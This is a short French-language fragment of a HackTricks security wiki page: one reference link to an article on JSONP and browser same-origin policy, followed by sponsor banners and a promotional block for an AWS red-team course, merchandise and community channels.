* [https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b](https://medium.com/entersoftsecurity/every-bug-bounty-hunter-should-know-the-evil-smile-of-the-jsonp-over-the-browsers-same-origin-438af3a0ac3b)

<figure><img src="https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

<details>

<summary><strong>Apprenez le piratage AWS de z√©ro √† h√©ros avec</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

Autres fa√ßons de soutenir HackTricks:

* Si vous souhaitez voir votre **entreprise annonc√©e dans HackTricks** ou **t√©l√©charger HackTricks en PDF**, consultez les [**PLANS D'ABONNEMENT**](https://github.com/sponsors/carlospolop)!
* Obtenez le [**swag officiel PEASS & HackTricks**](https://peass.creator-spring.com)
* D√©couvrez [**La famille PEASS**](https://opensea.io/collection/the-peass-family), notre collection exclusive de [**NFTs**](https://opensea.io/collection/the-peass-family)
* **Rejoignez** üí¨ le **groupe Discord**](https://discord.gg/hRep4RUj7f) ou le [**groupe Telegram**](https://t.me/peass) ou **suivez** nous sur **Twitter** üê¶ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **Partagez vos astuces de piratage en soumettant des PR aux** [**HackTricks**](https://github.com/carlospolop/hacktricks) et [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
